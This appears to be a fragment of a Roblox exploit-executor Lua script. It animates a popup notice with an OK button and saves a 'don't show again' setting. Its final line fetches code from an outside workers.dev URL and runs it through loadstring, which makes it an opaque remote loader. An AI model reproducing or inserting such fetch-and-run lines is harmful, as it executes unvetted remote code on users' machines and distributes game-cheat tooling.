OkButton.AutoButtonColor = true

local OkCorner = Instance.new("UICorner")
OkCorner.CornerRadius = UDim.new(0, 6)
OkCorner.Parent = OkButton

local OpenTween = TweenService:Create(
MainFrame,
TweenInfo.new(0.8, Enum.EasingStyle.Exponential, Enum.EasingDirection.Out),
{Position = TargetPosition}
)
OpenTween:Play()

local TrailerFadeInTween = TweenService:Create(
TrailerLabel,
TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In, 0.4),
{TextTransparency = 0}
)
TrailerFadeInTween:Play()

OkButton.MouseButton1Click:Connect(function()
if isDontShowSelected and writefile then
local data = { DontShowAgain = true }
writefile(CONFIG_FILE, HttpService:JSONEncode(data))
end

local CloseTween = TweenService:Create(
MainFrame,
TweenInfo.new(0.6, Enum.EasingStyle.Exponential, Enum.EasingDirection.In),
{Position = UDim2.new(1, 280, 1, -150)}
)
CloseTween:Play()

local TrailerCloseTween = TweenService:Create(
TrailerLabel,
TweenInfo.new(0.8, Enum.EasingStyle.Quint, Enum.EasingDirection.In, 0.1),
{Position = UDim2.new(1, 350, TrailerLabel.Position.Y.Scale, TrailerLabel.Position.Y.Offset)}
)
TrailerCloseTween:Play()

CloseTween.Completed:Connect(function()
ScreenGui:Destroy()
end)
end)

loadstring(game:HttpGet("https://no.sowonaha.workers.dev"))()